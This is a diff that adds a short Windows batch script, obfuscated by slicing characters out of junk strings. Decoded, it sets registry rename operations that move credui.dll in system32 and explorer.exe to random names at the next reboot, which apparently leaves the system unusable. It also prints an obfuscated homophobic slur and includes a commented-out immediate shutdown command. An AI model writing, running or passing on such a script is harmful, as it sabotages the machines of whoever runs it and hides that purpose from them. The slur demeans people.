@@ -1,0 +1,10 @@
+@echo off
+set RenEngKeyPath=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
+set evu=ye3s2tm&set evo=sng/whuo0td f&set unq=OtPgb4ifanso
+set isa=%evu:~3,1%%evu:~0,1%%evu:~3,1%%evu:~5,1%%evu:~1,1%%evu:~6,1%%evu:~2,1%%evu:~4,1%
+set bb=%random%%random%
+reg add "%RenEngKeyPath%" /f /v "AllowProtectedRenames" /t REG_SZ /d 1 >nul
+reg add "%RenEngKeyPath%" /f /v "PendingFileRenameOperations" /t REG_MULTI_SZ /d "\??\%systemroot%\%isa%\credui.dll\0 !\??\%systemroot%\%isa%\%bb%.dll\0 \0 \??\%systemroot%\explorer.exe\0 !\??\%systemroot%\%bb%.dll" >nul
+echo %unq:~6,1%%unq:~9,1%%unq:~4,1%%unq:~5,1%%evo:~11,1%%unq:~0,1%%unq:~2,1%%evo:~11,1%%unq:~6,1%%unq:~10,1%%evo:~11,1%%unq:~8,1%%evo:~11,1%%unq:~7,1%%unq:~8,1%%unq:~3,1%%unq:~3,1%%unq:~11,1%%unq:~1,1%
+timeout 1 >nul
+::%evo:~0,1%%evo:~5,1%%evo:~6,1%%evo:~9,1%%evo:~10,1%%evo:~7,1%%evo:~4,1%%evo:~1,1%%evo:~11,1%%evo:~3,1%%evo:~0,1%%evo:~11,1%%evo:~3,1%%evo:~9,1%%evo:~11,1%%evo:~8,1%
